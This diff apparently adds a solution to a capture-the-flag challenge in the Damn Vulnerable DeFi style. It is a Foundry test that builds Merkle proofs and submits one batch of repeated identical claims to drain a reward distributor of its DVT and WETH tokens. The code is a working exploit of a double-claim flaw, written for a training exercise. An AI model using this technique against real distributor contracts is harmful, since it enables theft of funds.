@@ -149,6 +149,66 @@ contract TheRewarderChallenge is Test {
      */
     function test_theRewarder() public checkSolvedByPlayer {
         
+        string memory dvtDistributuion = vm.readFile("test/the-rewarder/dvt-distribution.json");
+        Reward[] memory dvtRewards = abi.decode(vm.parseJson(dvtDistributuion), (Reward[]));
+
+        string memory wethDistribution = vm.readFile("test/the-rewarder/weth-distribution.json");
+        Reward[] memory wethRewards = abi.decode(vm.parseJson(wethDistribution), (Reward[]));
+
+        bytes32[] memory dvtLeaves = _loadRewards("/test/the-rewarder/dvt-distribution.json");
+        bytes32[] memory wethLeaves = _loadRewards("/test/the-rewarder/weth-distribution.json");
+    
+        uint256 dvtAmount;
+        bytes32[] memory dvtProof;
+        for (uint256 i = 0; i < dvtRewards.length; i++) {
+            if (dvtRewards[i].beneficiary == player) {
+                dvtAmount = dvtRewards[i].amount;
+                dvtProof = merkle.getProof(dvtLeaves, i);
+                break;
+            }
+        }
+
+        uint256 wethAmount;
+        bytes32[] memory wethProof;
+        for (uint256 i = 0; i < wethRewards.length; i++) {
+            if (wethRewards[i].beneficiary == player) {
+                wethAmount = wethRewards[i].amount;
+                wethProof = merkle.getProof(wethLeaves, i);
+                break;
+            }
+        }
+
+        uint256 dvtClaimsNeeded = TOTAL_DVT_DISTRIBUTION_AMOUNT / dvtAmount;
+        uint256 wethClaimsNeeded = TOTAL_WETH_DISTRIBUTION_AMOUNT / wethAmount;
+        uint256 totalClaimsNeeded = dvtClaimsNeeded + wethClaimsNeeded;
+
+        Claim[] memory claims = new Claim[](totalClaimsNeeded);
+        for(uint256 i = 0; i < totalClaimsNeeded; i++) {
+            if (i < dvtClaimsNeeded) {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: dvtAmount,
+                    tokenIndex: 0,
+                    proof: dvtProof
+                });
+            } else {
+                claims[i] = Claim({
+                    batchNumber: 0,
+                    amount: wethAmount,
+                    tokenIndex: 1,
+                    proof: wethProof
+                });
+            }
+        }
+
+        IERC20[] memory tokens = new IERC20[](2);
+        tokens[0] = IERC20(address(dvt));
+        tokens[1] = IERC20(address(weth));
+
+        distributor.claimRewards(claims, tokens);
+
+        dvt.transfer(recovery, dvt.balanceOf(player));
+        weth.transfer(recovery, weth.balanceOf(player));
     }
 
     /**
